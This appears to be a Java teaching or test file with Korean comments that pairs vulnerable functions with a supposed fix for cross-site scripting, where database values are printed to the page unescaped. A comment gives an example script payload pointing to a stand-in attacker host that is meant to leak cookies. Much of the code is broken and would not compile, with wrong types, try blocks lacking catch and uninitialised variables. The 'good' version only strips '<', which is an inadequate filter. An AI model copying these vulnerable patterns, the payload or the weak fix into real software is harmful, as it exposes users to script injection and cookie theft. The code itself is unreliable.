public class CS
{

/* 
아래 Java코드가 JSP 코드의 일부일 경우 외부 입력값 data 변수가 아무런 필터링없이 화면에 그대로 출력됩니다.
만약 공격자가 해당 입력값을 <script>url = "http://devil.com/attack.jsp;</script> 과 같은 스크립트 코드를 넣는다면 attack.jsp 코드가 수행되게 되어, 쿠키정보 등이 유출될 수 있습니다.
*/
public void bad1(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  	

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		response.getWriter().println("<br>bad(): data = " + data);
  	}
}

public void bad1_1(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		
  	PrintWriter writer = response.getWriter();

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		//response.getWriter().println("<br>bad(): data = " + data);
    		writer.println("<br>bad() : data = " + data);
  	}
}

public void bad1_2(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		Byte[] dataArray = data.getByte();
  		
  	ServletOutputStream out = response.getOutputStream();

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		//response.getWriter().println("<br>bad(): data = " + data);
    		out.write("<br>bad(): data = " + dataArray);
  	}
}

public void bad1_3(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		Byte[] dataArray = data.getByte();
  		
  	ServletOutputStream out = response.getOutputStream();

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		//response.getWriter().println("<br>bad(): data = " + data);
    		response.getOutputStream().write("<br>bad(): data = " + data);
  	}
}

public void bad2(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
	System.in.read(data);

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		response.getWriter().println("<br>bad(): data = " + data);
  	}
}

public void bad3(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
  	try {
    		conn = IO.getDBConnection();
    		statement = conn.prepareStatement("select name from users where id=0");
  	}

  	if (data != null)
  	{
		// 보안약점 : 외부 입력값이 필터링없이 화면에 출력
    		response.getWriter().println("<br>bad(): data = " + (statement.executeQuery()).getString());
  	}
}

/*
외부 입력값은 반드시 필터링 처리하여 출력합니다.
*/
public void good(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
  	try {
    		conn = IO.getDBConnection();
    		statement = conn.prepareStatement("select name from users where id=0");
    		rs = statement.executeQuery();
    		data = rs.getString(1); 
  	}

  	if (data != null)
  	{
		// 수정 : 외부 입력값의 특수문자를 필터링
    		response.getWriter().println("<br>bad(): data = " + data.replaceAll("<", ""));
  	}
}

}